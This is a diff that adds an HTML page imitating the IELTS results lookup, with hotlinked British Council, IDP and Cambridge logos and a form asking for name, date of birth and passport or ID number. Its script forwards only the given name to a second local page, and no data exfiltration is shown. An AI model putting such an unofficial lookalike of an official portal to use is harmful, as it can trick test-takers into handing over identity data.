@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Check Your IELTS Result</title>
+  <style>
+    /* Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* Body Styling */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* Main Container */
+    .container {
+      background: #fff;
+      padding: 2em;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      max-width: 640px;
+      width: 100%;
+      /* text-align: center; */
+    }
+
+    /* Logo */
+    .logo {
+      display: flex;
+      align-items: center;
+      /* justify-content: center; */
+      gap: 5px;
+      margin-bottom: 1em;
+    }
+
+    .logo img {
+      width: 54px;
+    }
+
+    .logo h2 {
+      color: #D61F26;
+      font-weight: bold;
+      font-size: 1.5em;
+    }
+
+    /* Heading */
+    h1 {
+      color: #333;
+      font-size: 1.5em;
+      margin-bottom: 0.5em;
+      font-weight: bold;
+    }
+
+    p {
+      color: #666;
+      font-size: 0.9em;
+      margin-bottom: 1.5em;
+      line-height: 1.4;
+      display: flex;
+      justify-content: center;
+    }
+
+    /* Input Fields */
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1em;
+      color: #333;
+    }
+
+    /* Button Styling */
+    .btn-primary {
+      width: 100%;
+      background-color: #D61F26;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 1em;
+    }
+
+    .btn-primary:hover {
+      background-color: #b7191f;
+    }
+
+    .btn-secondary {
+      width: 100%;
+      background-color: #fff;
+      color: #333;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 0.5em;
+    }
+
+    .btn-secondary:hover {
+      background-color: #f4f4f4;
+    }
+
+    /* Footer Note */
+    .footer {
+      font-size: 0.8em;
+      color: #aaa;
+      margin-top: 2em;
+    }
+
+    .footer img {
+      width: 40px;
+      margin: 0 5px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Logo Section -->
+  <div class="logo">
+    <img src="https://www.clipartmax.com/png/full/239-2393754_idp-ielts-logo.png " alt="IDP Logo">
+    <h2>IELTS</h2>
+  </div>
+
+  <!-- Heading -->
+  <h1>Get your IELTS results</h1>
+  <p>Your results available online are not official. They are provisional only until you receive your official Test Report Form (TRF).</p>
+
+  <!-- Form Section -->
+  <form id="resultForm">
+    <input type="text" name="given_name" placeholder="Given name" required>
+    <input type="text" name="surname" placeholder="Surname" required>
+    <input type="text" name="dob" placeholder="Date of birth: DD / MM / YYYY" required>
+    <input type="password" name="passport_id" placeholder="Passport number or ID number" required>
+    
+    <button type="button" onclick="submitForm()" class="btn-primary">Get results</button>
+    <button type="button" class="btn-secondary">Cancel</button>
+</form>
+
+<script>
+function submitForm() {
+    const form = document.getElementById('resultForm');
+    const givenName = form.elements['given_name'].value;
+    window.location.href = `page2.html?name=${encodeURIComponent(givenName)}`;
+}
+
+</script>
+
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>
+      <img style="width: 95px;" src="https://upload.wikimedia.org/wikipedia/commons/e/e3/BritishCouncil_Logo.png" alt="British Council Logo">
+      <img style="width: 70px; height: 32px; margin: 12px;" src="https://www.clipartmax.com/png/full/239-2393754_idp-ielts-logo.png" alt="IDP Logo">
+      <img style="width: 85px;" src="https://download.logo.wine/logo/University_of_Cambridge/University_of_Cambridge-Logo.wine.png" alt="Cambridge Logo">
+    </p>
+    <p>IELTS is jointly owned by the British Council, IDP IELTS, and Cambridge University Press & Assessment</p>
+  </div>
+</div>
+
+</body>
+</html>
